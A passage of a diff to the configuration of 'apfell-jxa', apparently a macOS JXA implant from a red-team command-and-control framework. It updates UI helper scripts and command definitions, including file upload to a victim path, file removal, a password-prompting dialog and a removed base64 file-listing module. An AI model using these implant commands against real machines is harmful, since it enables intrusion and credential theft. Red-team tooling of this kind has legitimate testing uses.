@@ -12,10 +12,9 @@
       "note": "This payload uses JavaScript for Automation (JXA) for execution on macOS boxes. \nThere have been issues with macOS < 10.13 and encryption, so be sure to blank out the AESPSK and set key exchange to \"F\" when creating those payloads.",
       "supports_dynamic_loading": true,
       "deleted": false,
-      "last_heartbeat": "03\/20\/2020 01:11:41",
+      "last_heartbeat": "05\/09\/2020 21:44:12",
       "ptype": "apfell-jxa",
       "file_extension": "js",
-      "wrapped_payload_type": "null",
       "icon": null,
       "files": [
         {
@@ -24,12 +23,28 @@
       ],
       "support_scripts": [
         {
-          "name": "create_table",
-          "script": "ZnVuY3Rpb24oaGVhZGVycywgZGF0YSl7CiAgdmFyIG91dHB1dCA9ICI8dGFibGUgc3R5bGU9J292ZXJmbG93OnNjcm9sbDt3aGl0ZS1zcGFjZTpub3dyYXA7d2lkdGg6MTAwJTtjb2xvcjp3aGl0ZScgY2xhc3M9J3RhYmxlLXN0cmlwZWQgdGFibGUtaG92ZXIgYm9yZGVyIGJvcmRlci1kYXJrIHNoYWRvdyB0YWJsZS1jb25kZW5zZWQgdGFibGUtZGFyayc+IjsKICBvdXRwdXQgKz0gIjx0cj4iOwogIGZvcih2YXIgaSA9IDA7IGkgPCBoZWFkZXJzLmxlbmd0aDsgaSsrKXsKICAgIG91dHB1dCArPSAiPHRoIHN0eWxlPSdiYWNrZ3JvdW5kLWNvbG9yOiMzOTM0ODU7Y29sb3I6d2hpdGU7aGVpZ2h0OjQwcHg7dGV4dC1hbGlnbjpsZWZ0O3BhZGRpbmc6MHB4IDBweCAwcHggMjBweDt3aWR0aDoiICsgaGVhZGVyc1tpXVsnc2l6ZSddICsgIicgb25jbGljaz1cInNvcnRfdGFibGUodGhpcylcIj4iICsgaGVhZGVyc1tpXVsnbmFtZSddLnRvVXBwZXJDYXNlKCkgKyAiPC90aD4iOwogIH0KICBvdXRwdXQgKz0gIjwvdHI+IjsKICBmb3IodmFyIGkgPSAwOyBpIDwgZGF0YS5sZW5ndGg7IGkrKyl7CiAgICBvdXRwdXQgKz0gIjx0ciBzdHlsZT0ndGV4dC1hbGlnbjpsZWZ0OyIgKyBkYXRhW2ldWydyb3ctc3R5bGUnXSArICInPiI7CiAgICBmb3IodmFyIGogPSAwOyBqIDwgaGVhZGVycy5sZW5ndGg7IGorKyl7CiAgICAgaWYoZGF0YVtpXVsnY2VsbC1zdHlsZSddLmhhc093blByb3BlcnR5KGhlYWRlcnNbal0pKXsKICAgICAgICBvdXRwdXQgKz0gIjx0ZCBzdHlsZT0ncGFkZGluZzowcHggMHB4IDBweCAyMHB4OyIgKyBkYXRhW2ldWydjZWxsLXN0eWxlJ11baGVhZGVyc1tqXVsnbmFtZSddXSArICInPiIgKyBkYXRhW2ldW2hlYWRlcnNbal1bJ25hbWUnXV0gKyAiPC90ZD4iOwogICAgIH0KICAgICBlbHNlewogICAgICAgIG91dHB1dCArPSAiPHRkIHN0eWxlPSdwYWRkaW5nOjBweCAwcHggMHB4IDIwcHgnPiIgKyBkYXRhW2ldW2hlYWRlcnNbal1bJ25hbWUnXV0gKyAiPC90ZD4iOwogICAgIH0KICAgIH0KICAgIG91dHB1dCArPSAiPC90cj4iOwogIH0KICBvdXRwdXQgKz0gIjwvdGFibGU+IjsKICByZXR1cm4gb3V0cHV0Owp9"
+          "name": "show_process_additional_info_modal",
+          "script": "ZnVuY3Rpb24oZWxlbSl7DQogICAgY29uc29sZS5sb2coZWxlbSk7DQogICAgdmFyIHVuaXF1ZU5hbWUgPSBlbGVtLmdldEF0dHJpYnV0ZSgibW9kYWwtbmFtZSIpOw0KICAgIHZhciBjb250ZW50ID0gZWxlbS5nZXRBdHRyaWJ1dGUoImFkZGl0aW9uYWwtaW5mbyIpOw0KICAgIHZhciB1bmlxdWVOYW1lSWQgPSAnIycgKyB1bmlxdWVOYW1lOw0KICAgIHZhciBtb2RhbEJvZHkgPSB1bmlxdWVOYW1lSWQgKyAnX2JvZHknOw0KICAgICQobW9kYWxCb2R5KS5odG1sKGNvbnRlbnQpOw0KICAgICQobW9kYWxCb2R5ICsgJyA+IHByZTpsYXN0JykuY3NzKCJ3b3JkLXdyYXAiLCAiYnJlYWstd29yZCIpOw0KICAgICQobW9kYWxCb2R5ICsgJyA+IHByZTpsYXN0JykuY3NzKCJ3aGl0ZS1zcGFjZSIsICJwcmUtd3JhcCIpOw0KICAgICQodW5pcXVlTmFtZUlkKS5tb2RhbCgnc2hvdycpOw0KfQ=="
+        },
+        {
+          "name": "integrity_level_to_string",
+          "script": "ZnVuY3Rpb24oaW50ZWdyaXR5TGV2ZWwpew0KICAgIHN3aXRjaChpbnRlZ3JpdHlMZXZlbCkNCiAgICB7DQogICAgICAgIGNhc2UgIlMtMS0xNi0wIjoNCiAgICAgICAgew0KICAgICAgICAgICAgcmV0dXJuICJVTlRSVVNURURfTUFOREFUT1JZX0xFVkVMIjsNCiAgICAgICAgfQ0KICAgICAgICBjYXNlICJTLTEtMTYtNDA5NiI6DQogICAgICAgIHsNCiAgICAgICAgICAgIHJldHVybiAiTE9XX01BTkRBVE9SWV9MRVZFTCI7DQogICAgICAgIH0NCiAgICAgICAgY2FzZSAiUy0xLTE2LTgxOTIiOg0KICAgICAgICB7DQogICAgICAgICAgICByZXR1cm4gIk1FRElVTV9NQU5EQVRPUllfTEVWRUwiOw0KICAgICAgICB9DQogICAgICAgIGNhc2UgIlMtMS0xNi04NDQ4IjoNCiAgICAgICAgew0KICAgICAgICAgICAgcmV0dXJuICJNRURJVU1fUExVU19NQU5EQVRPUllfTEVWRUwiOw0KICAgICAgICB9DQogICAgICAgIGNhc2UgIlMtMS0xNi0xMjI4OCI6DQogICAgICAgIHsNCiAgICAgICAgICAgIHJldHVybiAiSElHSF9NQU5EQVRPUllfTEVWRUwiOw0KICAgICAgICB9DQogICAgICAgIGNhc2UgIlMtMS0xNi0xNjM4NCI6DQogICAgICAgIHsNCiAgICAgICAgICAgIHJldHVybiAiU1lTVEVNX01BTkRBVE9SWV9MRVZFTCI7DQogICAgICAgIH0NCiAgICAgICAgY2FzZSAiUy0xLTE2LTIwNDgwIjoNCiAgICAgICAgew0KICAgICAgICAgICAgcmV0dXJuICJQUk9URUNURURfUFJPQ0VTU19NQU5EQVRPUllfTEVWRUwiOw0KICAgICAgICB9DQogICAgICAgIGNhc2UgIlMtMS0xNi0yODY3MiI6DQogICAgICAgIHsNCiAgICAgICAgICAgIHJldHVybiAiU0VDVVJFX1BST0NFU1NfTUFOREFUT1JZX0xFVkVMIjsNCiAgICAgICAgfQ0KICAgICAgICBkZWZhdWx0Og0KICAgICAgICAgICAgcmV0dXJuICIiDQogICAgfQ0KfQ=="
+        },
+        {
+          "name": "create_process_additional_info_modal",
+          "script": "ZnVuY3Rpb24odW5pcXVlTmFtZSl7DQogICAgdmFyIGlkID0gIiMiICsgdW5pcXVlTmFtZTsNCiAgICBpZiAoJChpZCkubGVuZ3RoICE9IDApDQogICAgew0KICAgICAgICByZXR1cm4gIiI7DQogICAgfQ0KICAgIHZhciBodG1sID0gYA0KICAgIDwhLS0gVEhJUyBJUyBPVVIgTU9EQUwgRk9SIEFERElORyBBIENPTU1FTlQgLS0+DQo8ZGl2IGNsYXNzPSJtb2RhbCBmYWRlIGJzLWV4YW1wbGUtbW9kYWwtbGciIGlkPSJgICsgdW5pcXVlTmFtZSArIGAiIHJvbGU9ImRpYWxvZyIgPg0KICAgIDxkaXYgY2xhc3M9Im1vZGFsLWRpYWxvZyBtb2RhbC1sZyIgcm9sZT0iZG9jdW1lbnQiPg0KICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1jb250ZW50Ij4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWhlYWRlciBiZy1kYXJrIHRleHQtd2hpdGUiPg0KICAgICAgICAgICAgQWRkaXRpb25hbCBQcm9jZXNzIERldGFpbHMNCiAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1ib2R5IiBpZD0iYCArIHVuaXF1ZU5hbWUgKyBgX2JvZHkiPg0KICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibW9kYWwtZm9vdGVyIj4NCiAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJidG4gYnRuLXN1Y2Nlc3MiIGRhdGEtZGlzbWlzcz0ibW9kYWwiIGFyaWEtaGlkZGVuPSJ0cnVlIj5PSzwvYnV0dG9uPg0KICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgPC9kaXY+DQogICAgPC9kaXY+DQo8L2Rpdj4NCjwhLS0gRU5EIE1PREFMIEZPUiBBRERJTkcgQSBDT01NRU5UIC0tPmA7DQogICAgcmV0dXJuIGh0bWw7DQp9"
+        },
+        {
+          "name": "file_size_to_human_readable_string",
+          "script": "ZnVuY3Rpb24oZmlsZVNpemUpew0KICAgIHZhciB0aHJlc2ggPSAxMDI0Ow0KICAgIGlmKE1hdGguYWJzKGZpbGVTaXplKSA8IHRocmVzaCkgew0KICAgICAgICByZXR1cm4gZmlsZVNpemUgKyAnIEInOw0KICAgIH0NCiAgICB2YXIgdW5pdHMgPSBbJ0tCJywnTUInLCdHQicsJ1RCJywnUEInLCdFQicsJ1pCJywnWUInXTsNCiAgICB2YXIgdSA9IC0xOw0KICAgIGRvIHsNCiAgICAgICAgZmlsZVNpemUgLz0gdGhyZXNoOw0KICAgICAgICArK3U7DQogICAgfSB3aGlsZShNYXRoLmFicyhmaWxlU2l6ZSkgPj0gdGhyZXNoICYmIHUgPCB1bml0cy5sZW5ndGggLSAxKTsNCiAgICByZXR1cm4gZmlsZVNpemUudG9GaXhlZCgxKSsnICcrdW5pdHNbdV07DQogIHJldHVybiBvdXRwdXQ7DQp9"
         },
         {
           "name": "collapsable",
           "script": "ZnVuY3Rpb24oaGVhZGVyLCBlbGVtZW50LCB1bmlxdWVfaWQpewoJLy90YWtlcyBpbiBpbmZvcm1hdGlvbiBhYm91dCB0aGUgaGVhZGVyIHRvIG1ha2UgYW5kIHRoZSBlbGVtZW50IHRvIGNvbGxhcHNlIHdpdGhpbiBpdCAoYXMgYSBzdHJpbmcpCgl2YXIgb3V0cHV0ID0gIjxkaXYgY2xhc3M9J2NhcmQnPjxkaXYgY2xhc3M9J2NhcmQtaGVhZGVyIGJvcmRlciBib3JkZXItZGFyayBzaGFkb3cnPjxhIGNsYXNzPSdidG4nIHR5cGU9J2J1dHRvbicgZGF0YS10b2dnbGU9J2NvbGxhcHNlJyBkYXRhLXRhcmdldD0nI2JzdGFzayIgKyB1bmlxdWVfaWQgKyAiJyBhcmlhLWV4cGFuZGVkPSdmYWxzZScgYXJpYS1jb250cm9scz0nYnN0YXNrIiArIHVuaXF1ZV9pZCArICInPiIrIGhlYWRlclsnbmFtZSddICsgIjwvYT48L2Rpdj4iOwogICAgICBvdXRwdXQgKz0gIjxkaXYgY2xhc3M9J2NvbGxhcHNlJyBpZD1cImJzdGFzayIgKyB1bmlxdWVfaWQgKyAiXCIgc3R5bGU9J3dpZHRoOjEwMCUnPiI7CiAgICAgIG91dHB1dCArPSAiPGRpdiBjbGFzcz0nYmctY2FyZC1ib2R5LWwyIGNhcmQtYm9keSBib3JkZXIgYm9yZGVyLWRhcmsgc2hhZG93Jz4iICsgZWxlbWVudCArICI8L2Rpdj48L2Rpdj48L2Rpdj4iOwogIHJldHVybiBvdXRwdXQ7Cn0="
+        },
+        {
+          "name": "create_table",
+          "script": "ZnVuY3Rpb24oaGVhZGVycywgZGF0YSl7CiAgdmFyIG91dHB1dCA9ICI8dGFibGUgc3R5bGU9J292ZXJmbG93OnNjcm9sbDt3aGl0ZS1zcGFjZTpub3dyYXA7d2lkdGg6MTAwJTtjb2xvcjp3aGl0ZScgY2xhc3M9J3RhYmxlLXN0cmlwZWQgdGFibGUtaG92ZXIgYm9yZGVyIGJvcmRlci1kYXJrIHNoYWRvdyB0YWJsZS1jb25kZW5zZWQgdGFibGUtZGFyayc+IjsKICBvdXRwdXQgKz0gIjx0cj4iOwogIGZvcih2YXIgaSA9IDA7IGkgPCBoZWFkZXJzLmxlbmd0aDsgaSsrKXsKICAgIG91dHB1dCArPSAiPHRoIHN0eWxlPSdiYWNrZ3JvdW5kLWNvbG9yOiMzOTM0ODU7Y29sb3I6d2hpdGU7aGVpZ2h0OjQwcHg7dGV4dC1hbGlnbjpsZWZ0O3BhZGRpbmc6MHB4IDBweCAwcHggMjBweDt3aWR0aDoiICsgaGVhZGVyc1tpXVsnc2l6ZSddICsgIicgb25jbGljaz1cInNvcnRfdGFibGUodGhpcylcIj4iICsgaGVhZGVyc1tpXVsnbmFtZSddLnRvVXBwZXJDYXNlKCkgKyAiPC90aD4iOwogIH0KICBvdXRwdXQgKz0gIjwvdHI+IjsKICBmb3IodmFyIGkgPSAwOyBpIDwgZGF0YS5sZW5ndGg7IGkrKyl7CiAgICBvdXRwdXQgKz0gIjx0ciBzdHlsZT0ndGV4dC1hbGlnbjpsZWZ0OyIgKyBkYXRhW2ldWydyb3ctc3R5bGUnXSArICInPiI7CiAgICBmb3IodmFyIGogPSAwOyBqIDwgaGVhZGVycy5sZW5ndGg7IGorKyl7CiAgICAgaWYoZGF0YVtpXVsnY2VsbC1zdHlsZSddLmhhc093blByb3BlcnR5KGhlYWRlcnNbal0pKXsKICAgICAgICBvdXRwdXQgKz0gIjx0ZCBzdHlsZT0ncGFkZGluZzowcHggMHB4IDBweCAyMHB4OyIgKyBkYXRhW2ldWydjZWxsLXN0eWxlJ11baGVhZGVyc1tqXVsnbmFtZSddXSArICInPiIgKyBkYXRhW2ldW2hlYWRlcnNbal1bJ25hbWUnXV0gKyAiPC90ZD4iOwogICAgIH0KICAgICBlbHNlewogICAgICAgIG91dHB1dCArPSAiPHRkIHN0eWxlPSdwYWRkaW5nOjBweCAwcHggMHB4IDIwcHgnPiIgKyBkYXRhW2ldW2hlYWRlcnNbal1bJ25hbWUnXV0gKyAiPC90ZD4iOwogICAgIH0KICAgIH0KICAgIG91dHB1dCArPSAiPC90cj4iOwogIH0KICBvdXRwdXQgKz0gIjwvdGFibGU+IjsKICByZXR1cm4gb3V0cHV0Owp9"
         }
       ],
       "c2_profiles": {
@@ -54,6 +69,7 @@
         }
       ],
       "create_transforms": [],
+      "wrapped": [],
       "transforms": [
         {
           "code": "YXN5bmMgZGVmIGpzb25TaW5nbGVQYXJhbWV0ZXIoc2VsZiwgdGFza19wYXJhbXM6IHN0ciwgcGFyYW1ldGVyOiBzdHIpIC0+IHN0cjoKICAgIGltcG9ydCBqc29uCiAgICBpZiBsZW4odGFza19wYXJhbXMpID09IDA6CiAgICAgICAgcmFpc2UgRXhjZXB0aW9uKCJNaXNzaW5nIGEgcGFyYW1ldGVyIikKICAgIGlmIHRhc2tfcGFyYW1zWzBdID09ICJ7IjoKICAgICAgICByZXR1cm4gdGFza19wYXJhbXMKICAgIGVsc2U6CiAgICAgICAgcGFyYW1fZGljdCA9IHt9CiAgICAgICAgcGFyYW1fZGljdFtwYXJhbWV0ZXJdID0gdGFza19wYXJhbXMKICAgICAgICByZXR1cm4ganNvbi5kdW1wcyhwYXJhbV9kaWN0KQogICAgICAgIHBhcmFtX2RpY3QgPSBqc29uLmxvYWRzKHRhc2tfcGFyYW1zKQ==",
@@ -61,7 +77,7 @@
           "parameter_type": "String",
           "description": "Takes a normal user string and converts it to a JSON string with one parameter",
           "is_command_code": true,
-          "timestamp": "03\/20\/2020 01:01:59",
+          "timestamp": "05\/07\/2020 07:01:49",
           "id": 11,
           "operator": "apfell_admin"
         },
@@ -71,7 +87,7 @@
           "parameter_type": "None",
           "description": "shorthand notation for apfell-jxa's test_command to allow a user to type \"test_password user password\"",
           "is_command_code": true,
-          "timestamp": "03\/20\/2020 01:01:59",
+          "timestamp": "05\/07\/2020 07:01:49",
           "id": 12,
           "operator": "apfell_admin"
         },
@@ -81,7 +97,7 @@
           "parameter_type": "None",
           "description": "Allow users to input sleep as \"number number\" for interval and jitter",
           "is_command_code": true,
-          "timestamp": "03\/20\/2020 01:01:59",
+          "timestamp": "05\/07\/2020 07:01:49",
           "id": 13,
           "operator": "apfell_admin"
         },
@@ -91,7 +107,7 @@
           "parameter_type": "None",
           "description": "This combines all of the selected commands together",
           "is_command_code": false,
-          "timestamp": "03\/20\/2020 01:01:59",
+          "timestamp": "05\/07\/2020 07:01:49",
           "id": 9,
           "operator": "apfell_admin"
         }
@@ -240,10 +256,10 @@
           "parameters": [
             {
               "type": "String",
-              "hint": "\/remote\/path\/on\/victim.txt",
+              "hint": "",
               "choices": "",
-              "required": true,
-              "name": "remote_path"
+              "required": false,
+              "name": "file_id"
             },
             {
               "type": "File",
@@ -254,10 +270,10 @@
             },
             {
               "type": "String",
-              "hint": "",
+              "hint": "\/remote\/path\/on\/victim.txt",
               "choices": "",
-              "required": false,
-              "name": "file_id"
+              "required": true,
+              "name": "remote_path"
             }
           ],
           "attack": [
@@ -313,7 +329,7 @@
               "hint": "",
               "choices": "",
               "required": true,
-              "name": "tab"
+              "name": "window"
             },
             {
               "type": "String",
@@ -327,7 +343,7 @@
               "hint": "",
               "choices": "",
               "required": true,
-              "name": "window"
+              "name": "tab"
             }
           ],
           "attack": [
@@ -431,9 +447,9 @@
               "parameter": "path",
               "active": true,
               "description": "",
-              "timestamp": "03\/20\/2020 01:01:59",
+              "timestamp": "05\/07\/2020 07:01:49",
               "command": "rm",
-              "command_id": 23,
+              "command_id": 28,
               "payload_type": "apfell-jxa",
               "transform": "jsonSingleParameter",
               "parameter_type": "String"
@@ -461,17 +477,10 @@
           "parameters": [
             {
               "type": "String",
-              "hint": "Default answer to pre-populate (will show up as *****)",
+              "hint": "Title of the dialog box",
               "choices": "",
               "required": false,
-              "name": "answer"
-            },
-            {
-              "type": "String",
-              "hint": "Additional descriptive text to display",
-              "choices": "",
-              "required": false,
-              "name": "text"
+              "name": "title"
             },
             {
               "type": "String",
@@ -482,10 +491,17 @@
             },
             {
               "type": "String",
-              "hint": "Title of the dialog box",
+              "hint": "Additional descriptive text to display",
               "choices": "",
               "required": false,
-              "name": "title"
+              "name": "text"
+            },
+            {
+              "type": "String",
+              "hint": "Default answer to pre-populate (will show up as *****)",
+              "choices": "",
+              "required": false,
+              "name": "answer"
             }
           ],
           "attack": [
@@ -498,13 +514,13 @@
             {
               "command_parameter": "null",
               "artifact": "Process Create",
-              "artifact_string": "osascript loaded dylib \/private\/var\/db\/CVMS\/cvmsCodeSignObj[somes_string]",
+              "artifact_string": "CVMServer wrote file \/private\/var\/db\/CVMS\/cvmsCodeSignObj[somes_string]",
               "replace_string": "*"
             },
             {
               "command_parameter": "null",
               "artifact": "Process Create",
-              "artifact_string": "CVMServer wrote file \/private\/var\/db\/CVMS\/cvmsCodeSignObj[somes_string]",
+              "artifact_string": "osascript loaded dylib \/private\/var\/db\/CVMS\/cvmsCodeSignObj[somes_string]",
               "replace_string": "*"
             }
           ],
@@ -564,9 +580,9 @@
               "parameter": "command",
               "active": true,
               "description": "",
-              "timestamp": "03\/20\/2020 01:01:59",
+              "timestamp": "05\/07\/2020 07:01:49",
               "command": "jsimport_call",
-              "command_id": 25,
+              "command_id": 30,
               "payload_type": "apfell-jxa",
               "transform": "jsonSingleParameter",
               "parameter_type": "String"
@@ -760,119 +776,6 @@
         },
         {
           "needs_admin": false,
-          "help_cmd": "ls \/path\/to\/file",
-          "version": 2,
-          "is_exit": false,
-          "is_file_browse": false,
-          "file_browse_parameters": "",
-          "is_process_list": false,
-          "process_list_parameters": "",
-          "is_download_file": false,
-          "download_file_parameters": "",
-          "is_remove_file": false,
-          "remove_file_parameters": "",
-          "is_agent_generator": false,
-          "author": "",
-          "deleted": false,
-          "description": "Get attributes about a file and display it to the user via API calls. No need for quotes and relative paths are fine",
-          "cmd": "ls",
-          "parameters": [
-            {
-              "type": "String",
-              "hint": "",
-              "choices": "",
-              "required": true,
-              "name": "path"
-            }
-          ],
-          "attack": [
-            {
-              "t_num": "T1106",
-              "attack_name": "Execution through API"
-            },
-            {
-              "t_num": "T1083",
-              "attack_name": "File and Directory Discovery"
-            }
-          ],
-          "artifacts": [],
-          "files": [
-            {
-              "ls.js": "ZXhwb3J0cy5scyA9IGZ1bmN0aW9uKHRhc2ssIGNvbW1hbmQsIHBhcmFtcyl7CiAgICBPYmpDLmltcG9ydCgnRm91bmRhdGlvbicpOwogICAgdHJ5IHsKICAgICAgICBsZXQgY29tbWFuZF9wYXJhbXMgPSBKU09OLnBhcnNlKHBhcmFtcyk7CiAgICAgICAgbGV0IGZpbGVNYW5hZ2VyID0gJC5OU0ZpbGVNYW5hZ2VyLmRlZmF1bHRNYW5hZ2VyOwogICAgICAgIGxldCBlcnJvciA9IFJlZigpOwogICAgICAgIGxldCBwYXRoID0gY29tbWFuZF9wYXJhbXNbJ3BhdGgnXTsKICAgICAgICBpZiAocGF0aCA9PT0gIiIgfHwgcGF0aCA9PT0gdW5kZWZpbmVkKSB7CiAgICAgICAgICAgIHBhdGggPSBmaWxlTWFuYWdlci5jdXJyZW50RGlyZWN0b3J5UGF0aC5qczsKICAgICAgICAgICAgaWYgKHBhdGggPT09IHVuZGVmaW5lZCB8fCBwYXRoID09PSAiIikgewogICAgICAgICAgICAgICAgcmV0dXJuIHsKICAgICAgICAgICAgICAgICAgICAidXNlcl9vdXRwdXQiOiAiRmFpbGVkIHRvIGdldCBjdXJyZW50IHdvcmtpbmcgZGlyZWN0b3J5IiwKICAgICAgICAgICAgICAgICAgICAiY29tcGxldGVkIjogdHJ1ZSwKICAgICAgICAgICAgICAgICAgICAic3RhdHVzIjogImVycm9yIgogICAgICAgICAgICAgICAgfTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZiAocGF0aFswXSA9PT0gJyInKSB7CiAgICAgICAgICAgIHBhdGggPSBwYXRoLnN1YnN0cmluZygxLCBwYXRoLmxlbmd0aCAtIDEpOwogICAgICAgIH0KICAgICAgICBpZihwYXRoWzBdID09PSAnficpewogICAgICAgICAgICBwYXRoID0gJChwYXRoKS5zdHJpbmdCeUV4cGFuZGluZ1RpbGRlSW5QYXRoLmpzOwogICAgICAgIH0KICAgICAgICBsZXQgYXR0cmlidXRlcyA9IE9iakMuZGVlcFVud3JhcChmaWxlTWFuYWdlci5hdHRyaWJ1dGVzT2ZJdGVtQXRQYXRoRXJyb3IoJChwYXRoKSwgZXJyb3IpKTsKICAgICAgICBpZiAoYXR0cmlidXRlcyAhPT0gdW5kZWZpbmVkKSB7CiAgICAgICAgICAgIGF0dHJpYnV0ZXNbJ3R5cGUnXSA9ICJGIjsKICAgICAgICAgICAgYXR0cmlidXRlc1snZmlsZXMnXSA9IFtdOwogICAgICAgICAgICBpZiAoYXR0cmlidXRlcy5oYXNPd25Qcm9wZXJ0eSgnTlNGaWxlVHlwZScpICYmIGF0dHJpYnV0ZXNbJ05TRmlsZVR5cGUnXSA9PT0gIk5TRmlsZVR5cGVEaXJlY3RvcnkiKSB7CiAgICAgICAgICAgICAgICBsZXQgZXJyb3IgPSBSZWYoKTsKICAgICAgICAgICAgICAgIGF0dHJpYnV0ZXNbJ3R5cGUnXSA9ICJEIjsKICAgICAgICAgICAgICAgIGxldCBmaWxlcyA9IE9iakMuZGVlcFVud3JhcChmaWxlTWFuYWdlci5jb250ZW50c09mRGlyZWN0b3J5QXRQYXRoRXJyb3IoJChwYXRoKSwgZXJyb3IpKTsKICAgICAgICAgICAgICAgIGlmIChmaWxlcyAhPT0gdW5kZWZpbmVkKSB7CiAgICAgICAgICAgICAgICAgICAgbGV0IGZpbGVzX2RhdGEgPSBbXTsKICAgICAgICAgICAgICAgICAgICBsZXQgc3ViX2ZpbGVzID0gZmlsZXM7CiAgICAgICAgICAgICAgICAgICAgaWYgKHBhdGhbcGF0aC5sZW5ndGggLSAxXSAhPT0gIi8iKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHBhdGggPSBwYXRoICsgIi8iOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IHN1Yl9maWxlcy5sZW5ndGg7IGkrKykgewogICAgICAgICAgICAgICAgICAgICAgICBsZXQgYXR0ciA9IE9iakMuZGVlcFVud3JhcChmaWxlTWFuYWdlci5hdHRyaWJ1dGVzT2ZJdGVtQXRQYXRoRXJyb3IoJChwYXRoICsgc3ViX2ZpbGVzW2ldKSwgZXJyb3IpKTsKICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGZpbGVfYWRkID0ge307CiAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfYWRkWyduYW1lJ10gPSBzdWJfZmlsZXNbaV07CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChhdHRyWydOU0ZpbGVUeXBlJ10gPT09ICJOU0ZpbGVUeXBlRGlyZWN0b3J5IikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9hZGRbJ3R5cGUnXSA9ICJEIjsKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfYWRkWyd0eXBlJ10gPSAiIjsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBsZXQgcGxpc3RQZXJtcyA9IE9iakMudW53cmFwKGZpbGVNYW5hZ2VyLmF0dHJpYnV0ZXNPZkl0ZW1BdFBhdGhFcnJvcigkKHBhdGggKyBzdWJfZmlsZXNbaV0pLCAkKCkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgaWYocGxpc3RQZXJtc1snTlNGaWxlRXh0ZW5kZWRBdHRyaWJ1dGVzJ10gIT09IHVuZGVmaW5lZCl7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgZXh0ZW5kZWQgPSB7fTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBwZXJtcyA9IHBsaXN0UGVybXNbJ05TRmlsZUV4dGVuZGVkQXR0cmlidXRlcyddLmpzOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yKGxldCBqIGluIHBlcm1zKXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleHRlbmRlZFtqXSA9IHBlcm1zW2pdLmJhc2U2NEVuY29kZWRTdHJpbmdXaXRoT3B0aW9ucygwKS5qczsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfYWRkWydFeHRlbmRlZEF0dHJpYnV0ZXMnXSA9IGV4dGVuZGVkOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfYWRkWydzaXplJ10gPSBhdHRyWydOU0ZpbGVTaXplJ107CiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBuc3Bvc2l4ID0gYXR0clsnTlNGaWxlUG9zaXhQZXJtaXNzaW9ucyddOwogICAgICAgICAgICAgICAgICAgICAgICAvLyB3ZSBuZWVkIHRvIGZpeCB0aGlzIG1lc3MgdG8gYWN0dWFsbHkgYmUgcmVhbCBwZXJtaXNzaW9uIGJpdHMgdGhhdCBtYWtlIHNlbnNlCiAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfYWRkWydwZXJtaXNzaW9ucyddID0gKChuc3Bvc2l4ID4+IDYpICYgMHg3KS50b1N0cmluZygpICsgKChuc3Bvc2l4ID4+IDMpICYgMHg3KS50b1N0cmluZygpICsgKG5zcG9zaXggJiAweDcpLnRvU3RyaW5nKCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfYWRkWydvd25lciddID0gYXR0clsnTlNGaWxlT3duZXJBY2NvdW50TmFtZSddICsgIigiICsgYXR0clsnTlNGaWxlT3duZXJBY2NvdW50SUQnXSArICIpIjsKICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9hZGRbJ2dyb3VwJ10gPSBhdHRyWydOU0ZpbGVHcm91cE93bmVyQWNjb3VudE5hbWUnXSArICIoIiArIGF0dHJbJ05TRmlsZUdyb3VwT3duZXJBY2NvdW50SUQnXSArICIpIjsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGF0dHJbJ05TRmlsZUV4dGVuc2lvbkhpZGRlbiddKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX2FkZFsnaGlkZGVuJ10gPSAiWSI7CiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX2FkZFsnaGlkZGVuJ10gPSAiIjsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBmaWxlc19kYXRhLnB1c2goZmlsZV9hZGQpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBhdHRyaWJ1dGVzWydmaWxlcyddID0gZmlsZXNfZGF0YTsKICAgICAgICAgICAgICAgIH1lbHNlewoKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBkZWxldGUgYXR0cmlidXRlc1snTlNGaWxlU3lzdGVtRmlsZU51bWJlciddOwogICAgICAgICAgICBkZWxldGUgYXR0cmlidXRlc1snTlNGaWxlU3lzdGVtTnVtYmVyJ107CiAgICAgICAgICAgIGRlbGV0ZSBhdHRyaWJ1dGVzWydOU0ZpbGVUeXBlJ107CiAgICAgICAgICAgIGxldCBuc3Bvc2l4ID0gYXR0cmlidXRlc1snTlNGaWxlUG9zaXhQZXJtaXNzaW9ucyddOwogICAgICAgICAgICAvLyB3ZSBuZWVkIHRvIGZpeCB0aGlzIG1lc3MgdG8gYWN0dW